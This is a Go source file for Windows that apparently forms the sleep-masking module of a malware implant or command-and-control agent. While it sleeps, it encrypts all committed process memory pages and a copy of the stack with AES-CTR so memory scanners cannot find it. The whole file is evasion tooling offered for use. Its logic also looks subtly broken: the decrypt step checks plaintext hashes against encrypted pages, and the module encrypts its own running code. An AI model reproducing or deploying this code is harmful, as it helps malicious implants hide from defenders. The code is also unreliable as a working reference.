//go:build windows && amd64

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	crand "crypto/rand"
	"sync"
	"unsafe"
)

type zileanPage struct {
	base uintptr
	size uintptr
	prot uint32
}

type zileanCtx struct {
	mu               sync.Mutex
	key              [32]byte
	iv               [aes.BlockSize]byte
	pages            []zileanPage
	pageHashes       [][]byte
	stackBase        uintptr
	stackSize        uintptr
	stackBuf         []byte
	ready            bool
	integrityFailures int32
}

var (
	zVirtualQuery = kernel32.NewProc("VirtualQuery")
	zCtx          zileanCtx
	zInitOnce     sync.Once
)

type zMask struct{}

func getZileanMask() SleepMasker {
	zInitOnce.Do(zInit)
	if !zCtx.ready {
		return nil
	}
	return &zMask{}
}

func zInit() {
	if !enableSleepMask {
		return
	}
	if _, err := crand.Read(zCtx.key[:]); err != nil {
		return
	}
	zCtx.ready = true
	registerSleepMask("zilean", func() SleepMasker { return &zMask{} })
}

func (m *zMask) Encrypt() {
	zCtx.mu.Lock()
	defer zCtx.mu.Unlock()
	if !zCtx.ready {
		return
	}

	crand.Read(zCtx.key[:])
	crand.Read(zCtx.iv[:])

	sp := stackPtr()
	var mbi mbi
	zVirtualQuery.Call(sp, uintptr(unsafe.Pointer(&mbi)), uintptr(unsafe.Sizeof(mbi)))
	if mbi.state == memCommit && mbi.protect != pageNoaccess {
		zCtx.stackBase = mbi.baseAddr
		zCtx.stackSize = mbi.regionSize
		zCtx.stackBuf = make([]byte, zCtx.stackSize)
		readMem(zCtx.stackBuf, zCtx.stackBase, zCtx.stackSize)
	}

	zCtx.pages = enumPages()
	zEncryptPages(zCtx.pages)
}

func (m *zMask) Decrypt() {
	zCtx.mu.Lock()
	defer zCtx.mu.Unlock()
	if !zCtx.ready || len(zCtx.pages) == 0 {
		return
	}

	zDecryptPages(zCtx.pages)
	zCtx.pages = nil
	zCtx.pageHashes = nil

	if zCtx.stackBuf != nil && zCtx.stackSize > 0 {
		var old uint32
		procVirtualProtect.Call(zCtx.stackBase, zCtx.stackSize, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))
		writeMem(zCtx.stackBase, zCtx.stackBuf, zCtx.stackSize)
		procVirtualProtect.Call(zCtx.stackBase, zCtx.stackSize, uintptr(old), uintptr(unsafe.Pointer(&old)))
		zCtx.stackBuf = nil
	}
}

func (m *zMask) BeforeSleep(d uintptr) {
	procSleep.Call(d)
}

func (m *zMask) AfterWake() {}

func (m *zMask) Name() string { return "zilean" }

func stackPtr() uintptr {
	var x int
	return uintptr(unsafe.Pointer(&x))
}

type mbi struct {
	baseAddr   uintptr
	allocBase  uintptr
	allocProt  uint32
	regionSize uintptr
	state      uint32
	protect    uint32
	typeField  uint32
}

func enumPages() []zileanPage {
	var out []zileanPage
	addr := uintptr(0)
	for {
		var m mbi
		ret, _, _ := zVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&m)), uintptr(unsafe.Sizeof(m)))
		if ret == 0 {
			break
		}
		if m.state == memCommit && m.protect != pageNoaccess {
			out = append(out, zileanPage{base: m.baseAddr, size: m.regionSize, prot: m.protect})
		}
		next := m.baseAddr + m.regionSize
		if next <= addr {
			break
		}
		addr = next
	}
	return out
}

func zEncryptPages(pages []zileanPage) {
	block, err := aes.NewCipher(zCtx.key[:])
	if err != nil {
		return
	}
	stream := cipher.NewCTR(block, zCtx.iv[:])

	zCtx.pageHashes = make([][]byte, len(pages))

	for i := range pages {
		p := &pages[i]
		if p.size == 0 {
			continue
		}

		buf := unsafe.Slice((*byte)(unsafe.Pointer(p.base)), p.size)

		h := sha256.Sum256(buf)
		zCtx.pageHashes[i] = h[:]

		var old uint32
		procVirtualProtect.Call(p.base, p.size, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))

		tmp := make([]byte, len(buf))
		copy(tmp, buf)
		stream.XORKeyStream(buf, tmp)
		for j := range tmp { tmp[j] = 0 }

		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

func zDecryptPages(pages []zileanPage) {
	block, err := aes.NewCipher(zCtx.key[:])
	if err != nil {
		return
	}
	stream := cipher.NewCTR(block, zCtx.iv[:])

	for i := len(pages) - 1; i >= 0; i-- {
		p := &pages[i]
		if p.size == 0 {
			continue
		}

		buf := unsafe.Slice((*byte)(unsafe.Pointer(p.base)), p.size)

		if i < len(zCtx.pageHashes) && zCtx.pageHashes[i] != nil {
			h := sha256.Sum256(buf)
			if !bytes.Equal(h[:], zCtx.pageHashes[i]) {
				zCtx.integrityFailures++
				if zCtx.integrityFailures == 1 {
					reportSleepMaskIntegrityFailure("zilean", i)
				}
				continue
			}
		}

		var old uint32
		procVirtualProtect.Call(p.base, p.size, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))

		tmp := make([]byte, len(buf))
		copy(tmp, buf)
		stream.XORKeyStream(buf, tmp)
		for j := range tmp { tmp[j] = 0 }

		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

func readMem(dst []byte, src uintptr, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		dst[i] = *(*byte)(unsafe.Pointer(src + i))
	}
}

func writeMem(dst uintptr, src []byte, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = src[i]
	}
}

func init() {
	zInitOnce.Do(zInit)
}
